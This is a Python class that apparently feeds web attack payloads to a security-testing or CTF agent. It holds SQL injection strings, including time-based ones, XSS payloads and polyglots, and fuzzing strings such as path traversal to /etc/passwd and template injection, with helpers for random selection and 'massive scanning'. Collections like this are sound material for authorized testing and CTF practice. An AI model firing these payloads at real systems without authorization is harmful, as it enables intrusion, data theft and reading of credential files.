import random
from typing import List, Dict

class PayloadManager:
    """
    Manages real-world security payloads for the agent.
    Includes Polyglots, Fuzzing strings, and specific attack vectors.
    """
    
    def __init__(self):
        # --- SQL Injection ---
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'/*"
        ]
        
        self.sqli_time_based = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' OR SLEEP(5)#",
            "'; pg_sleep(5)--",
            "(SELECT BENCHMARK(1000000,MD5('A')))"
        ]
        
        # --- XSS (Cross-Site Scripting) ---
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>"
        ]
        
        self.xss_polyglots = [
            "javascript://%250Aalert(1)//\"/*\\'/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>",
            "\"`'><script>alert(1)</script>",
            "';alert(1)//"
        ]
        
        # --- Fuzzing / Anomalies ---
        self.fuzz_payloads = [
            "A" * 1000, # Buffer Overflow check
            "../../../../etc/passwd", # Path Traversal
            "%00", # Null byte
            "{{7*7}}", # SSTI
            "${7*7}", # SSTI
            "<!--", # Unclosed comment
            "'", # Single quote
            "\"", # Double quote
            ";", # Terminator
            "|" # Pipe
        ]
        
        # --- CTF Specific ---
        self.ctf_payloads = [
            "CTF",
            "flag",
            "admin",
            "root",
            "secret"
        ]

    def get_sqli(self, complexity: str = "simple") -> str:
        """Get an SQLi payload based on complexity"""
        if complexity == "time":
            return random.choice(self.sqli_time_based)
        return random.choice(self.sqli_payloads)

    def get_xss(self, complexity: str = "simple") -> str:
        """Get an XSS payload"""
        if complexity == "polyglot":
            return random.choice(self.xss_polyglots)
        return random.choice(self.xss_payloads)

    def get_fuzz(self) -> str:
        """Get a fuzzing payload"""
        return random.choice(self.fuzz_payloads)
        
    def get_all_payloads(self) -> List[str]:
        """Return a flat list of all payloads for massive scanning"""
        return self.sqli_payloads + self.sqli_time_based + \
               self.xss_payloads + self.xss_polyglots + \
               self.fuzz_payloads + self.ctf_payloads
